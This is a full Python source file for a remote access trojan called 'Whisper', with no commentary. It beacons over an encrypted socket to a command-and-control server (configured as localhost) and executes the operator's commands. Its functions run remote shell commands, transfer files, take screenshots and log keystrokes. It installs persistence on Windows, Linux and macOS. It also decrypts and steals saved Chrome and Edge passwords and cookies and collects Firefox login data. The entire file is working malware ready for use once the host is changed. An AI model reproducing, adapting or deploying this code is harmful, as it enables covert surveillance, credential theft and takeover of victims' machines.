import socket, base64, json, os, sys, subprocess, platform, time, threading, sqlite3, shutil, tempfile, struct, hashlib, hmac

C2_HOST = "127.0.0.1"
C2_PORT = 4443
ENCRYPTION_PASSWORD = "whisper_secret_key"
RECONNECT_DELAY = 10
KEYLOGGER_ENABLED = False

def derive_key(password, salt=b"whisper_salt_2024", length=32):
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000, length)

def encrypt_bytes(plain, key):
    iv = os.urandom(16)
    ks, ctr = b"", 0
    while len(ks) < len(plain):
        ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest(); ctr += 1
    ct = bytes(p ^ k for p, k in zip(plain, ks))
    tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]
    return iv + tag + ct

def decrypt_bytes(data, key):
    iv, tag, ct = data[:16], data[16:32], data[32:]
    if not hmac.compare_digest(tag, hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]):
        raise ValueError("Integrity check failed")
    ks, ctr = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest(); ctr += 1
    return bytes(p ^ k for p, k in zip(ct, ks))

def encrypt(data): return base64.b64encode(encrypt_bytes(json.dumps(data).encode(), derive_key(ENCRYPTION_PASSWORD)))
def decrypt(data): return json.loads(decrypt_bytes(base64.b64decode(data), derive_key(ENCRYPTION_PASSWORD)))

def system_info():
    return {
        "os": platform.platform(), "hostname": platform.node(),
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "unknown",
        "arch": platform.machine(), "cwd": os.getcwd(),
        "pid": os.getpid(), "privilege": get_privilege(),
    }

def get_privilege():
    if platform.system() == "Windows":
        try:
            import ctypes
            return "Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "User"
        except: return "unknown"
    return "Root" if os.geteuid() == 0 else "User"

def exec_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return (result.stdout + result.stderr) or "(no output)"
    except subprocess.TimeoutExpired: return "[!] Command timed out"
    except Exception as e: return f"[!] Error: {e}"

def list_dir(path="."):
    try:
        items = []
        for entry in os.scandir(path):
            items.append({
                "name": entry.name, "type": "dir" if entry.is_dir() else "file",
                "size": entry.stat().st_size if entry.is_file() else 0,
                "modified": entry.stat().st_mtime,
            })
        return {"path": os.path.abspath(path), "items": items, "error": None}
    except Exception as e: return {"path": path, "items": [], "error": str(e)}

def take_screenshot():
    try:
        if platform.system() == "Windows":
            import io, mss
            from PIL import Image
            with mss.mss() as sct:
                buf = io.BytesIO()
                Image.frombytes("RGB", sct.monitors[1].size, sct.grab(sct.monitors[1]).rgb).save(buf, format="PNG")
                return buf.getvalue()
        elif platform.system() == "Linux":
            r = subprocess.run(["import", "-window", "root", "png:-"], capture_output=True, timeout=10)
            return r.stdout or None
        elif platform.system() == "Darwin":
            r = subprocess.run(["screencapture", "-x", "-t", "png", "-"], capture_output=True, timeout=10)
            return r.stdout or None
    except: return None

KEYSTROKES = []
KL_RUNNING = False

def keylogger_thread():
    global KEYSTROKES, KL_RUNNING
    KL_RUNNING = True
    if platform.system() == "Windows":
        from ctypes import windll
        while KL_RUNNING:
            for code in range(255):
                if windll.user32.GetAsyncKeyState(code) & 1: KEYSTROKES.append(code)
            time.sleep(0.01)
    elif platform.system() == "Linux":
        try:
            from pynput import keyboard
            def on_press(k):
                try: KEYSTROKES.append(k.char)
                except: KEYSTROKES.append(f"[{k}]")
            with keyboard.Listener(on_press=on_press) as listener: listener.join()
        except: pass
    KL_RUNNING = False

def start_keylogger():
    global KL_RUNNING
    if not KL_RUNNING: threading.Thread(target=keylogger_thread, daemon=True).start(); return "[+] Keylogger started"
    return "[!] Keylogger already running"

def stop_keylogger():
    global KL_RUNNING; KL_RUNNING = False; return "[+] Keylogger stopped"

def get_keylog():
    global KEYSTROKES
    out = "".join(str(c) if isinstance(c, int) else c for c in KEYSTROKES); KEYSTROKES.clear()
    return out or "(no keystrokes recorded)"

def install_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            script = os.path.abspath(sys.argv[0])
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "Whisper", 0, winreg.REG_SZ, script)
            return "[+] Persistence installed (HKCU Run)"
        elif platform.system() == "Linux":
            home = os.path.expanduser("~"); d = os.path.join(home, ".config", "autostart")
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "whisper.desktop"), "w") as f:
                f.write(f"[Desktop Entry]\nType=Application\nName=Whisper\nExec=python3 {os.path.abspath(sys.argv[0])}\n")
            return "[+] Persistence installed (~/.config/autostart)"
        elif platform.system() == "Darwin":
            home = os.path.expanduser("~")
            plist = os.path.join(home, "Library", "LaunchAgents", "com.whisper.plist")
            with open(plist, "w") as f:
                f.write(f'<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.whisper</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>{os.path.abspath(sys.argv[0])}</string></array><key>RunAtLoad</key><true/></dict></plist>')
            subprocess.run(["launchctl", "load", plist], capture_output=True)
            return "[+] Persistence installed (LaunchAgent)"
    except Exception as e: return f"[!] Persistence failed: {e}"

def decrypt_chrome_key(encrypted_key):
    try:
        import ctypes
        from ctypes import wintypes
        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
        kb = base64.b64decode(encrypted_key)
        if kb[:5] == b"DPAPI": kb = kb[5:]
        bi = BLOB(len(kb), ctypes.cast(kb, ctypes.POINTER(ctypes.c_byte)))
        bo = BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.pbData, bo.cbData)
            ctypes.windll.kernel32.LocalFree(bo.pbData); return r
    except: return None

_AESGCM = None
def _get_aesgcm():
    global _AESGCM
    if _AESGCM is None:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            _AESGCM = AESGCM
        except: _AESGCM = False
    return _AESGCM

def decrypt_chrome_value(val, key):
    aes = _get_aesgcm()
    if not aes: return None
    try: return aes(key).decrypt(val[:12], val[12:], None).decode("utf-8", errors="replace")
    except: return None

def harvest_chromium(path):
    creds = []
    try:
        ls = os.path.join(path, "Local State")
        if not os.path.exists(ls): return creds
        with open(ls, "r", encoding="utf-8") as f: state = json.load(f)
        ek = state.get("os_crypt", {}).get("encrypted_key", "")
        if not ek: return creds
        mk = decrypt_chrome_key(ek)
        if not mk: return creds
        for entry in os.listdir(path):
            db = os.path.join(path, entry, "Login Data")
            if not os.path.isfile(db): continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db, tmp)
                for row in sqlite3.connect(tmp).execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if not row[2]: continue
                    pw = decrypt_chrome_value(row[2], mk)
                    creds.append({"url": row[0][:120], "user": row[1], "pass": pw if pw else "[needs pycryptodome]"})
            except: pass
            finally:
                try: os.remove(tmp)
                except: pass
    except: pass
    return creds

def harvest_firefox():
    creds = []
    try:
        base = {"Windows": os.environ.get("APPDATA", ""), "Linux": os.path.expanduser("~/.mozilla/firefox"),
                "Darwin": os.path.expanduser("~/Library/Application Support/Firefox/Profiles")}.get(platform.system(), "")
        if not os.path.isdir(base): return creds
        for prof in os.listdir(base):
            lf = os.path.join(base, prof, "logins.json")
            if not os.path.isfile(lf): continue
            try:
                with open(lf, "r", encoding="utf-8") as f: data = json.load(f)
                for item in data.get("logins", []):
                    creds.append({"url": item.get("hostname", "")[:120], "user": item.get("encryptedUsername", "[encrypted]"), "pass": item.get("encryptedPassword", "[encrypted]")})
            except: pass
    except: pass
    return creds

def harvest_cookies_chromium(path):
    cookies = []
    try:
        ls = os.path.join(path, "Local State")
        if not os.path.exists(ls): return cookies
        with open(ls, "r", encoding="utf-8") as f: state = json.load(f)
        ek = state.get("os_crypt", {}).get("encrypted_key", "")
        if not ek: return cookies
        mk = decrypt_chrome_key(ek)
        if not mk: return cookies
        for entry in os.listdir(path):
            db = os.path.join(path, entry, "Cookies")
            if not os.path.isfile(db): continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db, tmp)
                for row in sqlite3.connect(tmp).execute("SELECT host_key, name, encrypted_value FROM cookies"):
                    if not row[2]: continue
                    val = decrypt_chrome_value(row[2], mk)
                    if val: cookies.append({"host": row[0], "name": row[1], "value": val})
            except: pass
            finally:
                try: os.remove(tmp)
                except: pass
    except: pass
    return cookies

def harvest_browsers():
    r = {"passwords": [], "cookies": []}
    if platform.system() == "Windows":
        local = os.environ.get("LOCALAPPDATA", "")
        for b, p in [("Chrome", os.path.join(local, "Google", "Chrome", "User Data")), ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data"))]:
            if os.path.isdir(p):
                r["passwords"].extend({"browser": b, **c} for c in harvest_chromium(p))
                r["cookies"].extend({"browser": b, **c} for c in harvest_cookies_chromium(p))
    r["passwords"].extend({"browser": "Firefox", **c} for c in harvest_firefox())
    r["total_passwords"] = len(r["passwords"]); r["total_cookies"] = len(r["cookies"])
    return r

def recv_msg(sock):
    raw = sock.recv(4)
    if not raw: return None
    size = int.from_bytes(raw, "big")
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk: return None
        data += chunk
    return decrypt(data)

def send_msg(sock, data):
    payload = encrypt(data)
    sock.sendall(len(payload).to_bytes(4, "big") + payload)

def _do_upload(m):
    try:
        os.makedirs(os.path.dirname(m["path"]), exist_ok=True)
        with open(m["path"], "wb") as f: f.write(base64.b64decode(m["data"]))
        return {"output": f"[+] Uploaded to {m['path']}"}
    except Exception as e: return {"output": f"[!] Upload failed: {e}"}

def _do_download(m):
    try:
        with open(m["path"], "rb") as f: return {"data": base64.b64encode(f.read()).decode()}
    except Exception as e: return {"error": str(e)}

def _do_screenshot(m):
    img = take_screenshot()
    if img: return {"data": base64.b64encode(img).decode()}
    return {"output": "[!] Screenshot failed"}

COMMANDS = {
    "shell": lambda m: {"output": exec_cmd(m["cmd"])},
    "upload": _do_upload, "download": _do_download, "ls": lambda m: list_dir(m.get("path", ".")),
    "screenshot": _do_screenshot, "keylog_start": lambda m: {"output": start_keylogger()},
    "keylog_stop": lambda m: {"output": stop_keylogger()}, "keylog_get": lambda m: {"output": get_keylog()},
    "persist": lambda m: {"output": install_persistence()}, "info": lambda m: system_info(),
    "harvest": lambda m: {"data": harvest_browsers()},
}

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))
            send_msg(sock, {"type": "init", **system_info()})
            sock.settimeout(15)
            while True:
                try:
                    msg = recv_msg(sock)
                    if msg is None: break
                except socket.timeout:
                    send_msg(sock, {"type": "ping"})
                    continue
                if msg["type"] == "exit": sock.close(); return
                fn = COMMANDS.get(msg["type"])
                if fn:
                    resp = {"type": "response", **fn(msg)}
                    send_msg(sock, resp)
        except (ConnectionRefusedError, socket.timeout, ConnectionAbortedError, ConnectionResetError, OSError): pass
        except KeyboardInterrupt: break
        except: pass
        finally:
            try: sock.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
